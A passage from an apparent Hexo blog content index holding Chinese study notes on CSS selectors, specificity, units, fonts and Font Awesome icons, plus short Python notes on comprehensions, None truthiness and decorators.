title="子元素选择器"></a>子元素选择器</h4><ul><li>选择第一个子元素</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tag<span class="selector-pseudo">:first</span>-child&#123;&#125;</span><br></pre></td></tr></table></figure><pre><code>选中所有元素里面的第一个tag元素若该子元素不是第一个，则不选中</code></pre><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tag<span class="selector-pseudo">:last-child</span>&#123;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tag<span class="selector-pseudo">:nth-child</span>(x)&#123;&#125;</span><br></pre></td></tr></table></figure><pre><code>选中所有父元素的x个tag当x=even时 选择偶数x=odd 奇数实例:表格</code></pre><ul><li>在元素中选择</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tag<span class="selector-pseudo">:first</span>-of-type&#123;&#125;</span><br></pre></td></tr></table></figure><pre><code>在tag中选择第一个，不管谁是tag的父元素</code></pre><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e:last-of-tyoe&#123;&#125;</span><br><span class="line">e<span class="selector-pseudo">:nth-of-type</span>(x)&#123;&#125;</span><br></pre></td></tr></table></figure><h4 id="否定选择器"><a href="#否定选择器" class="headerlink" title="否定选择器"></a>否定选择器</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-pseudo">:not</span>(选择器)&#123;&#125;</span><br></pre></td></tr></table></figure><blockquote><p><a href="http://flukeout.github.io/">练习选择器的一个网站</a></p></blockquote><h3 id="样式的继承"><a href="#样式的继承" class="headerlink" title="样式的继承"></a>样式的继承</h3><ul><li>父元素的一些样式会继承给子代</li><li>背景样式，边框，定位样式都不会变</li><li>是否可以继承可以参考w3cschool网站</li></ul><h3 id="选择器的优先级"><a href="#选择器的优先级" class="headerlink" title="选择器的优先级"></a>选择器的优先级</h3><p>当选择器选中相同的元素时，优先级高的生效</p><ul><li><p>内联样式1000</p></li><li><p>id选择器100</p></li><li><p>类和伪类10</p></li><li><p>元素选择器</p></li><li><p>通配*0</p></li><li><p>继承，没有优先级</p></li></ul><blockquote><p>有多种选择器时，相加比较，但不会超过<strong>最大数量级</strong></p><p>优先级一样时，用后面的（覆盖）</p><p>并集选择器不会相加，单独计算</p><p>在样式后面添加<code>!important</code>，优先级最大，开发时建议尽量不用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line"> <span class="attribute">color</span>:yellow <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><h3 id="长度单位"><a href="#长度单位" class="headerlink" title="长度单位"></a>长度单位</h3><ul><li><p><code>px</code></p><ul><li>相当于屏幕的像素点</li><li>屏幕好，像素点小（像素多）</li></ul></li><li><p><code>%</code></p><ul><li>可以根据父元素的大小设置子元素的大小，适用于自适应界面</li></ul></li><li><p><code>em</code></p><ul><li><code>1em=1font-size</code></li><li>em可以根据当前字体大小设置长度</li></ul></li><li><p><code>rem</code></p><ul><li>相对与根元素字体大小设置</li></ul></li></ul><h3 id="颜色单位"><a href="#颜色单位" class="headerlink" title="颜色单位"></a>颜色单位</h3><h4 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h4><p>红(red)绿(green)蓝(blue)三原色</p><p>两种表示方法</p><ul><li><p><code>rgb(0-255,0-255,0-255)</code></p></li><li><p><code>rgb(0-100%,0-100%,0-100%)</code></p></li></ul><p>用十六进制表示0-255</p><p><code>#+00-ff（red）+00-ff(green)+00-ff(blue)</code></p><p>当有两两重复时可以简写</p><p><code>#ff0000,#f00</code></p><h4 id="RGBA"><a href="#RGBA" class="headerlink" title="RGBA"></a>RGBA</h4><ul><li>需要四个值，前三个和RGB一样，第四个代表透明度(<code>0</code>,<code>.5</code>,<code>1</code>)<ul><li><code>rgb(0,0,0,.54)</code></li></ul></li></ul><h4 id="HSL和HSLA"><a href="#HSL和HSLA" class="headerlink" title="HSL和HSLA"></a>HSL和HSLA</h4><ul><li>H(hue)：色相（0-360）</li><li>S(saturation)：饱和度，颜色浓度（0-100%）</li><li>L(lightness)：亮度，颜色亮度（0-100%）</li><li>A代表透明度<ul><li><code>hsl(100,100%,0.543)</code></li></ul></li></ul><h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><ul><li><p>颜色<code>color</code></p></li><li><p>字体大小<code>font-size</code>（默认16px）</p><p>实际设置的是字体所在的”格”</p></li><li><p>字体用<code>font-family</code>修改，可使用多种字体用<code>,</code>隔开，优先最前面的</p></li><li><p><code>font-style</code>设置字体风格</p><p>italic，oblique，normal</p></li><li><p><code>font-weight</code>设置字体粗细</p><p>normal，bold，bolder，lighter，100-900</p></li><li><p><code>font-variant</code>小型字母大写</p><p>normal</p><p>small-caps（大写字母缩小）</p></li><li><p>快速设置字体的多种样式，简写</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">p</span>&#123;</span><br><span class="line"> <span class="attribute">font</span>:italic bold <span class="number">20px</span> <span class="string">&quot;字体&quot;</span>;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>**文字的大小和字体必须写，并且大小和字体必须最后按顺序写****优点**：加载性能好</code></pre><ul><li><p>字体分类</p><p><strong>serif</strong><br><strong>sans-serif</strong><br><strong>monospace</strong><br><strong>cursive</strong><br><strong>fantasy</strong></p><p>一般作为最后一个字体</p></li><li><p>从服务器里加载字体</p></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">@font-face</span>&#123;</span><br><span class="line">    <span class="comment">/* 指定字体名 */</span></span><br><span class="line"><span class="attribute">font-family</span>:<span class="string">&quot;fontName&quot;</span>;</span><br><span class="line">    <span class="comment">/* 路径 */</span></span><br><span class="line"><span class="attribute">src</span>: <span class="built_in">url</span>(<span class="string">&quot;./font/font.ttf&quot;</span>)，</span><br><span class="line">        <span class="built_in">url</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以后可以直接使用fontName字体</p><p>缺点：加载速度，<strong>版权</strong></p><h3 id="new-图标字体（iconfont）"><a href="#new-图标字体（iconfont）" class="headerlink" title="[new]图标字体（iconfont）"></a>[new]图标字体（iconfont）</h3><blockquote><p>【百度百科】矢量图是根据几何特性来绘制图形，<a href="https://baike.baidu.com/item/矢量/12795520">矢量</a>可以是一个点或一条线，矢量图只能靠<a href="https://baike.baidu.com/item/软件/12053">软件</a>生成，文件占用内在空间较小，因为这种类型的图像文件包含独立的分离图像，可以自由无限制的重新组合。它的特点是放大后图像不会失真，和<a href="https://baike.baidu.com/item/分辨率/213523">分辨率</a>无关，适用于图形设计、文字设计和一些标志设计、版式设计等</p></blockquote><ul><li>网页一些小的图标如果使用图片的话比较麻烦，而且图片比较大，不灵活</li><li>而字体是矢量图，不会失真，于是可以把这些图标做成矢量图</li><li>使用引入字体的形式来使用这些图标</li></ul><p><em>fontawesome使用步骤</em></p><ol><li><a href="https://fontawesome.com/how-to-use/on-the-web/setup/hosting-font-awesome-yourself">官网下载</a>，大陆可能比较慢，找梯子爬吧</li><li>解压</li><li>将css和webfonts<strong>放在一起</strong>移动到项目</li><li>将all.css引入网页</li><li>查api文档使用图标</li><li>fab和fas免费</li></ol><p>举几个例子</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--head--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./fontawesome/css/all.css&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- body --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;font-size: 2rem;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-home fa-fw&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background:MistyRose&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Home<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-info fa-fw&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background:MistyRose&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Info<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-book fa-fw&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background:MistyRose&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Library<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-pencil-alt fa-fw&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background:MistyRose&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Applications<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-cog fa-fw&quot;</span> <span class="attr">style</span>=<span class="string">&quot;background:MistyRose&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span> Settings<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其他用法</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-tag">li</span><span class="selector-pseudo">::before</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="comment">/* 图标编码 */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">content</span>: <span class="string">&quot;\f1b0&quot;</span>;</span></span><br><span class="line"><span class="css">            <span class="comment">/* 使用编码的其他设置，在.css文件里面找使用的字体族，其他属性也要写上才会生效 */</span></span></span><br><span class="line"><span class="css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Font Awesome 5 Free&#x27;</span>;</span></span><br><span class="line"><span class="css">            <span class="attribute">font-weight</span>: <span class="number">900</span>;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./fontawesome/css/all.css&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>test<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>test<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>test<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>test<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 通过实体来使用图标 ，class这个类引入字体族及特殊属性，后面的&amp;#x;代表十六进制编码，可以去api文档查询--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;fas&quot;</span>&gt;</span><span class="symbol">&amp;#xf1b0;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.iconfont.cn">阿里的图标库</a></p><p><strong><em>注意版权，以免不必要的纠纷</em></strong></p><h3 id="行高（行间距）"><a href="#行高（行间距）" class="headerlink" title="行高（行间距）"></a>行高（行间距）</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">line-height</span>:<span class="number">40px</span>;</span><br></pre></td></tr></table></figure><ul><li><p>line-height设置行高</p><p>1相当与100%</p></li><li><p>文字默认在行高中垂直居中显示</p></li></ul><p><code>行间距=行高－字体大小</code></p><ul><li>行高也可以在<code>font</code>中设置</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 字体大小/行高 */</span></span><br><span class="line"><span class="attribute">font</span>: <span class="number">16px</span>/<span class="number">30px</span> <span class="string">&quot;字体&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>单行字体想在<strong>父元素中居中</strong>显示时只需将字体的行高设置与父元素一致</p><p>设置样式时注意覆盖问题</p></blockquote><h3 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h3><p><code>text-tansform</code></p><ul><li>none默认</li><li>captalize单词首字母大写</li><li>uppercase都大写</li><li>lowercase都小写</li></ul><p><code>text-decoration</code>修饰</p><ul><li><p>none</p></li><li><p>underline下划线</p></li><li><p>overline上划线</p></li><li><p>line-through删除线</p></li></ul><blockquote><p>超链接默认text-decoration默认是underline</p></blockquote><p><code>letter-spacing</code>修改字符间距</p><p><code>word-spacing</code>单词间距(中文没多大用)</p><p><code>text-align</code>设置对齐方式</p><ul><li><p>left靠 左，默认</p></li><li><p>right靠右</p></li><li><p>center居中</p></li><li><p>justify两端对齐</p></li></ul><p><code>text-indent</code>设置首行缩进</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">text-indent</span>:<span class="number">2em</span>;</span><br></pre></td></tr></table></figure><ul><li>正值向右</li><li>负值向左</li></ul><h2 id="IDE-Hbuildx"><a href="#IDE-Hbuildx" class="headerlink" title="IDE-Hbuildx"></a>IDE-Hbuildx</h2><table><thead><tr><th>常用快捷键</th><th>意义</th></tr></thead><tbody><tr><td><code>ctrl+insert</code></td><td>快速复制行</td></tr><tr><td><code>alt+/</code></td><td>代码提示</td></tr><tr><td><code>ctrl+k</code></td><td>格式化文本</td></tr><tr><td>p.class1+<code>tab</code></td><td>快速创建元素</td></tr><tr><td>！+<code>tab</code></td><td>得到整体框架</td></tr><tr><td>ctrl+]</td><td>包围tag</td></tr><tr><td>ctrl+shift+k</td><td>反格式化</td></tr><tr><td>p.class1$*8+<code>tab</code></td><td></td></tr><tr><td></td><td></td></tr></tbody></table><h2 id="IDE-VScode"><a href="#IDE-VScode" class="headerlink" title="IDE-VScode"></a>IDE-VScode</h2><p>里面的插件很好用</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pythonic</title>
      <link href="/Programming/Python/pythonic.html"/>
      <url>/Programming/Python/pythonic.html</url>
      
        <content type="html"><![CDATA[<p>很python的东西</p><span id="more"></span><h3 id="列表推导式"><a href="#列表推导式" class="headerlink" title="列表推导式"></a>列表推导式</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line"></span><br><span class="line">b = [i**<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> a <span class="keyword">if</span> i &gt;=<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">c = &#123;i**<span class="number">3</span> <span class="keyword">for</span> i <span class="keyword">in</span> a&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt;[<span class="number">16</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">49</span>]</span><br><span class="line">&gt;&gt;&gt;&#123;<span class="number">64</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">343</span>, <span class="number">216</span>, <span class="number">27</span>, <span class="number">125</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="None"><a href="#None" class="headerlink" title="None"></a>None</h3><p>None不是空字符串，不是空列表，不是0，不是False</p><p>它也是一个对象，python里面一切都是对象</p><p>判空</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> a:</span><br><span class="line">    a != <span class="literal">None</span></span><br><span class="line">    a != <span class="string">&#x27; &#x27;</span></span><br><span class="line">    a !=[]</span><br><span class="line">    a != <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> a:</span><br></pre></td></tr></table></figure><p>虽然None和False对应的分支是一样的，但他们的意义不一样，几乎所有对象都与bool值有转化关系</p><h3 id="内置方法"><a href="#内置方法" class="headerlink" title="内置方法"></a>内置方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__bool__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 调用len()</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"> <span class="comment"># 判断类是否为False时主要看这两个内置函数</span></span><br><span class="line"><span class="comment"># 共存时主要是__bool__</span></span><br><span class="line"><span class="comment"># 在python2里面则是__nonzero__</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pythonic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>装饰器</title>
      <link href="/Programming/Python/decorator.html"/>
      <url>/Programming/Python/decorator.html</url>
      
        <content type="html"><![CDATA[<p>当需求变更，在给函数添加新功能时，遵循”对修改是封闭的，对扩展是开放的”，也就是说不去修改函数而是扩展函数</p><span id="more"></span><p>举个简单的栗子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is f1&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is f2&quot;</span>)</span><br><span class="line">f1()</span><br><span class="line">f2()</span><br></pre></td></tr></table></figure><p>需要给上面的函数新增一个打印当前时间的功能，为了不破坏原有的函数，可以这样做</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is f1&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is f2&quot;</span>)</span><br><span class="line"><span class="comment"># f1()</span></span><br><span class="line"><span class="comment"># f2()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">current_time</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(time.time())</span><br><span class="line">    func()</span><br><span class="line">current_time(f1)</span><br><span class="line">current_time(f2)</span><br></pre></td></tr></table></figure><p>这种做法不怎么”优雅”，它改变了原有的结构，改变了调用方式，解决的办法就是装饰器</p><h3 id="定义装饰器"><a href="#定义装饰器" class="headerlink" title="定义装饰器"></a>定义装饰器</h3><p>本质就是函数或类，python是可以将函数作为参数进行传递和返回的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(time.time())</span><br><span class="line">        func()</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><p>那怎么使用呢？如果采用下面的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t = decorator(f1)</span><br><span class="line">t()</span><br></pre></td></tr></table></figure><p>这样其实还是破坏了原有结构，接下来使用语法糖</p><h3 id="语法糖"><a href="#语法糖" class="headerlink" title="语法糖"></a>语法糖</h3><p><code>@</code>就是装饰器的语法糖，之所以叫语法糖是因为看着舒服，写着舒服，就像吃了糖一样（与其对应的还有语法盐）</p><p>它的作用就是可以省略赋值操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>():</span></span><br><span class="line">        <span class="built_in">print</span>(time.time())</span><br><span class="line">        func()</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"><span class="meta">@decorator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is f1&quot;</span>)</span><br><span class="line"><span class="meta">@decorator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is f2&quot;</span>)</span><br><span class="line">f1()</span><br><span class="line">f2()</span><br></pre></td></tr></table></figure><p>定义了装饰器，使用了语法糖，而原函数和调用都没有改变</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>上面都是没有参数的函数，当函数有一个甚至多个参数时装饰器又该怎么改变呢</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">p1</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(time.time())</span><br><span class="line">        func(p1)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"><span class="meta">@decorator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">p1</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is &quot;</span>+p1)</span><br><span class="line"><span class="meta">@decorator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>(<span class="params">p1,p2</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is &quot;</span>+p1+p2)</span><br><span class="line">f1(p1)</span><br></pre></td></tr></table></figure><p>如果在装饰器内指定参数个数的话，那么它就不具有通用性了，这没有任何意义，需要使用可变参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(time.time())</span><br><span class="line">        func(*args)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"><span class="meta">@decorator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span>(<span class="params">p1</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is &quot;</span>+p1)</span><br><span class="line"><span class="meta">@decorator</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span>(<span class="params">p1,p2</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;this is &quot;</span>+p1+p2)</span><br><span class="line">f1(<span 